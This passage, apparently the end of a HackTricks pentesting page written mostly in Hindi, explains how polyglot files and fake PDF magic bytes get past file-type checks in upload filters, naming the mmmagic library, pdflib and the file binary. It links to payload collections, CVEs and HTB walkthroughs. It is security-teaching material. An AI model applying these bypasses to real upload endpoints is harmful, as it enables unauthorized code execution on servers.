Polyglot files की मुख्य उपयोगिता उन सुरक्षा उपायों को बायपास करने की क्षमता में निहित है जो फ़ाइलों को प्रकार के आधार पर स्क्रिन करते हैं। विभिन्न applications में सामान्य प्रथा केवल कुछ file types को upload की अनुमति देना है—जैसे JPEG, GIF, या DOC—ताकि संभावित हानिकारक फ़ॉर्मैट्स (उदा., JS, PHP, या Phar फ़ाइलें) से जोख़िम कम हो सके। हालांकि, एक polyglot, कई file types की संरचनात्मक आवश्यकताओं का पालन करके, इन सीमाओं को चुपके से बायपास कर सकता है।

उनकी अनुकूलता के बावजूद, polyglots को सीमाओं का सामना भी करना पड़ता है। उदाहरण के लिए, जबकि एक polyglot एक ही समय में PHAR file (PHp ARchive) और JPEG दोनों का रूप ले सकता है, उसकी upload की सफलता प्लेटफ़ॉर्म की file extension नीतियों पर निर्भर हो सकती है। यदि सिस्टम अनुमत एक्सटेंशनों के प्रति कड़ा है, तो polyglot की केवल संरचनात्मक द्वैतता उसके upload की गारंटी देने के लिए पर्याप्त नहीं हो सकती।

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

How to avoid file type detections by uploading a valid JSON file even if not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: जब तक `%PDF` magic bytes पहले 1024 bytes में मौजूद हैं यह वैध माना जाता है (पोस्ट से उदाहरण देखें)
- **`pdflib` library**: JSON के अंदर एक फेक PDF format जोड़ें ताकि library इसे pdf समझे (पोस्ट से उदाहरण देखें)
- **`file` binary**: यह एक फ़ाइल से 1048576 bytes तक पढ़ सकता है। बस एक JSON बनाएं जो इससे बड़ा हो ताकि यह सामग्री को json के रूप में पार्स न कर सके और फिर JSON के अंदर असली PDF का आरंभिक हिस्सा डाल दें, और यह उसे PDF समझ लेगा

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
